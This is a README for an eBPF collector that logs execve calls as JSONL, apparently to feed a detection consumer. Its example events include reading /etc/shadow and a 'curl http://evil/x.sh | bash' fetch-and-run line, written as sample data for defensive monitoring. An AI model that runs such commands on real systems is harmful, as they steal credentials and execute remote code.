# Event stream samples

The eBPF collector (`bin/execguard`) hooks the `execve` syscall and emits
**line-delimited JSON** (JSONL) to stdout — one object per command executed.
Your consumer reads this from stdin.

## Integration

Live:

```sh
sudo ./bin/execguard | your_consumer
```

Replay a captured sample (no root, no kernel needed — pure stdin):

```sh
cat samples/sample-events.jsonl | your_consumer
```

## Contract

One JSON object per line, UTF-8. Two fields:

| Field | Type | Notes |
|-------|------|-------|
| `executable` | string | resolved binary path (execve `filename` arg) |
| `argv` | []string | command + arguments/flags, as typed (up to 20 args × 128 bytes each) |

## Example

```json
{"executable":"/usr/bin/cat","argv":["cat","/etc/shadow"]}
{"executable":"/bin/sh","argv":["/bin/sh","-c","curl http://evil/x.sh | bash"]}
```
